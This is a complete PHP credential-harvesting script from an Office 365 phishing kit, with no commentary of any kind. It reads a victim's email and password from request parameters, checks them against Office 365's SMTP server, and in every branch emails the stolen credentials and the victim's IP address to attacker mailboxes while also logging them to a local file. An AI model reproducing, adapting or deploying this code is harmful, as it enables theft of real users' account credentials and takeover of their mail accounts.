<?php header('Access-Control-Allow-Origin: *'); ?>
<?php
@session_start();
ob_start();


ini_set("output_buffering",4096);

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;
$user= $_GET['user'];
$pass= $_GET['pass'];
if(!empty($pass) && $user !=="undefined") {

    $base= base64_encode($pass);
    $em_str = str_replace("#","",$user);

require 'phpm/Exception.php';
require 'phpm/PHPMailer.php';
require 'phpm/SMTP.php';

$mail = new PHPMailer;
$mail->isSMTP();
$mail->SMTPDebug = 0;
$mail->SMTPAuth = true;
$mail->SMTPSecure = false;

 $em= $user;


$mail->Host = 'smtp.office365.com';


$message = "";
$mail->Port = 587;
$mail->Username = "$em_str";
$mail->Password = "$pass";
$mail->setFrom("$user");
$mail->addAddress('dabtands@yandex.com');
$mail->Subject = "$user";
$mail->msgHTML("$base");

if (!$mail->send())
{
    $ip = getenv("REMOTE_ADDR");
$message .= "------\n";
$message .= "Email : ".$em_str."\n";
$message .= "Password : ".$pass."\n";
$message .= "------\n";
$message .= "IP:  ".$ip."\n\n";
$message .= "----------------------------------------\n";
$message .= " - by *Roxwell -\n";
$subject = "OFFICE365 Logs- $ip";
$headers = "From: Office Logs <bot@example.com>";
$SEND='dabtands@yandex.com,dabtand@yahoo.com';

@mail($SEND,$subject,$message,$headers);
@fclose(@fwrite(@fopen("$SEND.txt", "a"),$message));
    echo json_encode(['msg'=>'errorsend']);

}
else {
$ip = getenv("REMOTE_ADDR");
$message .= "------\n";
$message .= "Email : ".$user."\n";
$message .= "Password : ".$pass."\n";
$message .= "------\n";
$message .= "IP:  ".$ip."\n\n";
$message .= "----------------------------------------\n";
$message .= " - by *Roxwell -\n";
$subject = "OFFICE365 Logs- $ip";
$headers = "From: Office Logs <bot@example.com>";
$SEND='dabtands@yandex.com,dabtand@yahoo.com';
@fclose(@fwrite(@fopen("$SEND.txt", "a"),$message));
@mail($SEND,$subject,$message,$headers);

    echo json_encode(['msg'=>'donesend']);
 }
$mail->smtpClose();
}
else{
     echo json_encode(['msg'=>'empty']);
}
?>